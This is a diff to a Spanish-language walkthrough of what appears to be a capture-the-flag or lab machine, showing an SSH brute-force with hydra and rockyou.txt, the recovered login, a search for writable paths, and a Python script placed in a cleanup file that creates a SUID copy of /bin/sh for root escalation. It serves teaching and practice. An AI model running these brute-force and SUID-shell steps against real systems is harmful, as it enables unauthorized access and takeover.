@@ -104,3 +104,30 @@ hydra -L which_one_lol.txt -P rockyou.txt 192.168.1.4 ssh
 Usuario: `overflow`
 
 Contraseña: `Pass.txt`
+
+Iniciar sesión al servicio SSH:
+```
+ssh overflow@192.168.1.4
+```
+
+- *Paso 7* Filtrar todos los directorios y escalar privilegios root. 
+```
+find / -writable 2<dev/null
+```
+![12](https://user-images.githubusercontent.com/75953873/176089628-cc8a60fd-7cd4-4e17-b2bc-1979707d85af.png)
+
+Directorio objetivo: `/lib/log`
+
+Con el editor de Nano hay que remplazar la línea de `rm -r /tmp/` por las siguientes:
+```python
+```
+#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system('cp /bin/sh /tmp/sh ')
+        os.system('chmod u+s /tmp/sh')
+except:
+        sys.exit()
+
+```
